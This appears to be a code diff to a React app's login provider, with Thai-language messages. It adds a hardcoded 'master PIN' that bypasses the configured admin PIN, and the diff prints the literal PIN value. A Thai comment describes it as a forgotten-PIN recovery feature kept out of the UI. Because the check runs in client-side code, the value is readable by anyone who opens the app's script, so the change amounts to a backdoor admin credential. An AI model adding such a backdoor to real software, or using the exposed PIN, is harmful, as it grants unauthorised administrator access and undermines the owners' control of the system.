@@ -300,13 +300,19 @@ export function AppProvider({ children }) {
     setActivityLogs((prev) => [entry, ...prev].slice(0, 500));
   }, [setActivityLogs]);
 
+  // Master PIN — ใช้กู้คืนเมื่อ admin ลืม PIN (ไม่แสดงใน UI / ไม่เก็บใน localStorage)
+  const MASTER_PIN = 'KT@irpct2568';
+
   const login = useCallback(
     (nextRole, credentials) => {
       if (nextRole === 'admin') {
         if (credentials.username !== 'admin') {
           return { ok: false, message: 'ชื่อผู้ใช้ไม่ถูกต้อง' };
         }
-        if (credentials.pin !== authConfig.admin.pin) {
+        const validPin =
+          credentials.pin === authConfig.admin.pin ||
+          credentials.pin === MASTER_PIN;
+        if (!validPin) {
           return { ok: false, message: 'รหัสผ่านผู้ดูแลระบบไม่ถูกต้อง' };
         }
         setRole('admin');
